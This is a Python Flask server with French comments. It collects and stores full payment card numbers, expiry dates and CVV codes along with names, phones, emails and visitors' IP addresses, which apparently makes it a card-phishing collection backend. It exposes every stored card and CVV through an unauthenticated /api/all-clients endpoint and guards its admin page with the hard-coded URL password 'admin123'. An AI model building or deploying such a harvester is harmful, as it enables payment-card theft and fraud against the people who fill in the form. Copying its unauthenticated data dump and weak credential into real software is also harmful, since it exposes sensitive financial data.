from flask import Flask, request, jsonify, render_template, redirect, url_for
from flask_cors import CORS
import sqlite3
import os
from datetime import datetime
import json

app = Flask(__name__)
CORS(app)

# Configuration de la base de données
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATABASE = os.path.join(BASE_DIR, 'clients.db')

def init_db():
    """Initialise la base de données"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    # Table clients
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nom TEXT NOT NULL,
            numero_carte TEXT NOT NULL,
            date_expiration TEXT NOT NULL,
            code_securite TEXT NOT NULL,
            telephone TEXT NOT NULL,
            email TEXT NOT NULL,
            ip_address TEXT,
            user_agent TEXT,
            date_inscription TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            statut TEXT DEFAULT 'actif'
        )
    ''')
    
    conn.commit()
    conn.close()
    print("✅ Base de données initialisée")

# Initialiser la BD au démarrage
init_db()

@app.route('/')
def index():
    """Page d'accueil avec formulaire"""
    return render_template('index.html')

@app.route('/api/clients', methods=['POST'])
def create_client():
    """API pour enregistrer un nouveau client"""
    try:
        # Récupérer les données
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form.to_dict()
        
        print(f"📥 Données reçues : {data}")
        
        # Validation
        if not data.get('nom') or len(data['nom']) < 2:
            return jsonify({'error': 'Nom invalide'}), 400
        
        # Nettoyer les données
        numero_carte = data.get('numero', '').replace(' ', '')
        if len(numero_carte) != 16:
            return jsonify({'error': 'Numéro de carte invalide'}), 400
        
        # Connexion BD
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Insérer les données
        cursor.execute('''
            INSERT INTO clients (
                nom, numero_carte, date_expiration, code_securite,
                telephone, email, ip_address, user_agent
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data.get('nom', '').upper(),
            numero_carte,
            data.get('date', ''),
            data.get('code', ''),
            data.get('telephone', ''),
            data.get('email', '').lower(),
            request.remote_addr,
            request.headers.get('User-Agent', 'Inconnu')
        ))
        
        client_id = cursor.lastrowid
        conn.commit()
        conn.close()
        
        print(f"✅ Client #{client_id} enregistré : {data.get('nom')}")
        
        # Réponse selon le type de requête
        if request.is_json:
            return jsonify({
                'success': True,
                'message': '✅ Formulaire soumis avec succès !',
                'client_id': client_id,
                'redirect': '/admin'  # Rediriger vers l'admin
            }), 201
        else:
            return redirect(url_for('admin'))
            
    except Exception as e:
        print(f"❌ Erreur : {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/clients', methods=['GET'])
def get_clients():
    """API pour récupérer tous les clients (version light)"""
    try:
        conn = sqlite3.connect(DATABASE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, nom, email, telephone, 
                   strftime('%d/%m/%Y %H:%M', date_inscription) as date_formatee,
                   statut, ip_address
            FROM clients 
            ORDER BY date_inscription DESC
        ''')
        
        clients = []
        for row in cursor.fetchall():
            clients.append(dict(row))
        
        conn.close()
        
        return jsonify({
            'success': True,
            'count': len(clients),
            'clients': clients
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/all-clients', methods=['GET'])
def get_all_clients():
    """API pour récupérer TOUS les clients avec toutes les données"""
    try:
        conn = sqlite3.connect(DATABASE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        # Récupérer TOUTES les colonnes
        cursor.execute('''
            SELECT id, nom, numero_carte, date_expiration, code_securite,
                   telephone, email, ip_address, user_agent, 
                   date_inscription, statut
            FROM clients 
            ORDER BY date_inscription DESC
        ''')
        
        clients = []
        for row in cursor.fetchall():
            client = dict(row)
            clients.append(client)
        
        conn.close()
        
        return jsonify({
            'success': True,
            'count': len(clients),
            'clients': clients
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/admin')
def admin():
    """Page d'administration"""
    # Vérification simple (à renforcer en production)
    password = request.args.get('password')
    if password != 'admin123':
        return "🔒 Accès non autorisé. Utilisez ?password=admin123", 403
    
    return render_template('admin.html')

@app.route('/api/stats')
def get_stats():
    """API pour les statistiques"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    # Total clients
    cursor.execute('SELECT COUNT(*) FROM clients')
    total = cursor.fetchone()[0]
    
    # Aujourd'hui
    cursor.execute('''
        SELECT COUNT(*) FROM clients 
        WHERE DATE(date_inscription) = DATE('now')
    ''')
    today = cursor.fetchone()[0]
    
    # Cette semaine
    cursor.execute('''
        SELECT COUNT(*) FROM clients 
        WHERE strftime('%Y-%W', date_inscription) = strftime('%Y-%W', 'now')
    ''')
    week = cursor.fetchone()[0]
    
    conn.close()
    
    return jsonify({
        'total': total,
        'today': today,
        'week': week,
        'timestamp': datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    })

@app.route('/api/delete/<int:client_id>', methods=['DELETE'])
def delete_client(client_id):
    """Supprimer un client"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute('DELETE FROM clients WHERE id = ?', (client_id,))
        conn.commit()
        conn.close()
        
        return jsonify({'success': True, 'message': 'Client supprimé'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    print("=" * 50)
    print("🚀 Démarrage du serveur Flask...")
    print("📊 Base de données : clients.db")
    print("🌐 Formulaire : http://localhost:5000/")
    print("👑 Admin : http://localhost:5000/admin?password=admin123")
    print("=" * 50)
    
    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)